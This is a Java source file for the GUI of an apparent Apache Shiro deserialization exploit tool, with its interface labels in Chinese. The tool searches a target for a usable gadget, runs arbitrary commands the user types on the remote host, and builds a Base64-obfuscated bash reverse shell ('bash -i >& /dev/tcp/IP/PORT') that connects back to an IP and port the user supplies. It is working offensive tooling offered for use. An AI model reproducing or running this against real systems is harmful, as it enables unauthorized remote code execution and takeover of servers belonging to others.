package com.shiroexploit.gui;

import com.shiroexploit.util.ExploitFailedException;
import com.shiroexploit.vulnverifier.Verifier;
import com.shiroexploit.vulnverifier.VerifierFactory;
import javafx.application.Platform;
import javafx.beans.value.ChangeListener;
import javafx.beans.value.ObservableValue;
import javafx.event.ActionEvent;
import javafx.event.EventHandler;
import javafx.geometry.Insets;
import javafx.geometry.Pos;
import javafx.scene.control.*;
import javafx.scene.input.KeyCode;
import javafx.scene.input.KeyEvent;
import javafx.scene.layout.BorderPane;
import javafx.scene.layout.HBox;
import javafx.scene.layout.Pane;
import javafx.scene.layout.VBox;
import java.io.PrintStream;
import java.util.Base64;

public class MainPane {
    private TextField cmd = new TextField();
    private TextField ipText = new TextField();
    private TextField portText = new TextField();
    private TextArea textArea = new TextArea();
    private Button execute = new Button();
    private Button getReverseShell = new Button();
    private CheckBox useReverseShell = new CheckBox("反弹Shell(Linux)");
    private BorderPane borderPane = new BorderPane();
    private PrintStream printStream;
    private Verifier verifier;
    private Label commandLabel = new Label("命令");
    private Label ipLabel = new Label("IP地址");
    private Label portLabel = new Label("端口");

    public MainPane(){
        drawPane();
        addListeners();
        //如此一来，简单太多了，原来的代码也不需要修改
        //参考 https://blog.csdn.net/qq_41886200/article/details/93711993
        printStream = new PrintStream(new Console(textArea));
        System.setOut(printStream);
        System.setErr(printStream);
        verifier = VerifierFactory.getInstance().getVerifier();
    }

    public Pane getPane() {
        return borderPane;
    }

    private void addListeners(){
        execute.setOnAction(new EventHandler<ActionEvent>() {
            @Override
            public void handle(ActionEvent event) {
                String command = cmd.getText().trim();
                if(command == null || command.equals("")){
                    PromptMessageUI.getAlert("输入错误","请输入一条有效的命令");
                    return;
                }

                commandLabel.setDisable(true);
                cmd.setDisable(true);
                execute.setDisable(true);
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        verifier.executeCmd(command);
                        commandLabel.setDisable(false);
                        cmd.setDisable(false);
                        execute.setDisable(false);
                        cmd.clear();
                        Platform.runLater(new Runnable() {
                            @Override
                            public void run() {
                                cmd.requestFocus();
                            }
                        });
                    }
                }).start();
            }
        });

        cmd.setOnKeyPressed(new EventHandler<KeyEvent>() {
            @Override
            public void handle(KeyEvent event) {
                //按Enter键时，具有和点击“执行”按钮同样的效果
                if(event.getCode() == KeyCode.ENTER){
                    execute.fire();
                }
            }
        });

        useReverseShell.selectedProperty().addListener(new ChangeListener<Boolean>() {
            @Override
            public void changed(ObservableValue<? extends Boolean> observable, Boolean oldValue, Boolean newValue) {
                if(useReverseShell.isSelected()){
                    commandLabel.setDisable(true);
                    cmd.setDisable(true);
                    execute.setDisable(true);
                    ipLabel.setDisable(false);
                    ipText.setDisable(false);
                    portLabel.setDisable(false);
                    portText.setDisable(false);
                    getReverseShell.setDisable(false);
                }else{
                    commandLabel.setDisable(false);
                    cmd.setDisable(false);
                    execute.setDisable(false);
                    ipLabel.setDisable(true);
                    ipText.setDisable(true);
                    portLabel.setDisable(true);
                    portText.setDisable(true);
                    getReverseShell.setDisable(true);
                }
            }
        });

        getReverseShell.setOnAction(new EventHandler<ActionEvent>() {
            @Override
            public void handle(ActionEvent event) {
                String ip = ipText.getText().trim();
                String port = portText.getText().trim();

                if(!checkIp(ip)){
                    PromptMessageUI.getAlert("输入错误","请输入一个有效的IP地址！");
                    return;
                }

                if(!checkPort(port)){
                    PromptMessageUI.getAlert("输入错误","请输入一个有效的端口！");
                    return;
                }


                ipLabel.setDisable(true);
                ipText.setDisable(true);
                portLabel.setDisable(true);
                portText.setDisable(true);
                getReverseShell.setDisable(true);
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        String command = "bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1";
                        Base64.Encoder encoder = Base64.getEncoder();
                        command = encoder.encodeToString(command.getBytes());
                        command = "bash -c {echo," + command + "}|{base64,-d}|{bash,-i}";

                        verifier.executeCmd(command);

                        ipLabel.setDisable(false);
                        ipText.setDisable(false);
                        portLabel.setDisable(false);
                        portText.setDisable(false);
                        getReverseShell.setDisable(false);

                    }
                }).start();
            }
        });

        //当textarea获得焦点时，清除其中的文字
        //参考http://www.it1352.com/960364.html
//        cmd.focusedProperty().addListener(new ChangeListener<Boolean>() {
//            @Override
//            public void changed(ObservableValue<? extends Boolean> observable, Boolean oldValue, Boolean newValue) {
//                if(newValue){
//                    cmd.clear();
//                }
//            }
//        });
    }

    private boolean checkPort(String port) {
        try{
            int p = Integer.parseInt(port);
            if(p > 0 && p < 65535){
                return true;
            }

            return false;
        }catch(NumberFormatException e){
            return false;
        }

    }

    private boolean checkIp(String ip) {
        try{
            String[] parts = ip.split("\\.");
            if(parts.length != 4) return false;

            for(String part : parts){
                int p = Integer.parseInt(part);
                if(p < 0 || p > 255){
                    return false;
                }
            }

            return true;
        }catch(Exception e){
            return false;
        }
    }

    private void drawPane(){
        BorderPane top = new BorderPane();
        top.setPadding(new Insets(10,10,10,10));

        commandLabel.setPrefHeight(35);
        commandLabel.setDisable(true);
        top.setMargin(commandLabel, new Insets(0,10,0,0));
        cmd.setPrefHeight(35);
        cmd.setDisable(true);
        top.setLeft(commandLabel);
        top.setCenter(cmd);

        execute.setText("执行");
        execute.setDisable(true);
        top.setMargin(execute, new Insets(0,0,0,10));
        top.setRight(execute);


        HBox hBox = new HBox();
        hBox.setAlignment(Pos.CENTER);
        useReverseShell.setSelected(false);
        useReverseShell.setDisable(true);
        hBox.setMargin(useReverseShell, new Insets(0,20,0,0));

        ipLabel.setPrefHeight(60);
        ipLabel.setDisable(true);
        hBox.setMargin(ipLabel, new Insets(0,10,0,0));

        ipText.setPrefWidth(150);
        ipText.setDisable(true);
        hBox.setMargin(ipText, new Insets(0,10,0,0));

        portLabel.setPrefHeight(30);
        portLabel.setDisable(true);
        hBox.setMargin(portLabel, new Insets(0,10,0,0));

        portText.setPrefWidth(80);
        portText.setDisable(true);
        hBox.setMargin(portText, new Insets(0,10,0,0));

        getReverseShell.setText("执行");
        getReverseShell.setDisable(true);
        hBox.getChildren().addAll(useReverseShell,ipLabel,ipText,portLabel,portText,getReverseShell);

        VBox vBox = new VBox();
        vBox.getChildren().addAll(top, hBox);

        textArea.setEditable(false);
        textArea.setWrapText(true);

        borderPane.setPadding(new Insets(10,10,10,10));
        borderPane.setTop(vBox);
        borderPane.setCenter(textArea);
        borderPane.setMargin(textArea, new Insets(10,10,10,10));
    }

    public void startRuning(){

        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    verifier.getValidGadget();
                    commandLabel.setDisable(false);
                    cmd.setDisable(false);
                    execute.setDisable(false);
                    useReverseShell.setDisable(false);
                } catch (ExploitFailedException e) {
                    System.out.println(e.getMessage());
                    System.out.println("[!] Target is not vulnerable or can not exploit");
                    Platform.runLater(new Runnable() {
                        @Override
                        public void run() {
                            PromptMessageUI.getAlert("检测失败","目标应用不存在相应漏洞或者无法找到可利用的反序列化Gadget!");
                        }
                    });
                }
            }
        });
        thread.start();
    }
}
